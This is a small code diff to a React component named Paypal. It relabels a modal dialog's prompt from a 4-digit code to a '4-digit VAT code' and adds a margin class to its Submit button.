@@ -79,7 +79,7 @@ const Paypal = () => {
       <Dialog open={showCodePopup} onClose={() => setShowCodePopup(false)}>
         <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
           <div className="bg-white p-6 rounded-lg shadow-lg">
-            <Dialog.Title className="text-lg font-bold">Enter 4-Digit Code</Dialog.Title>
+            <Dialog.Title className="text-lg font-bold">Enter 4-Digit VAT Code</Dialog.Title>
             <div className="mt-4">
               <input
                 type="text"
@@ -90,7 +90,7 @@ const Paypal = () => {
               />
               <button
                 onClick={() => handleCodeSubmit({ paypalEmail })}
-                className="mt-4 bg-green-500 text-white py-2 px-4 rounded-lg"
+                className="mt-4 bg-green-500 text-white py-2 px-4 rounded-lg mr-3"
               >
                 Submit
               </button>
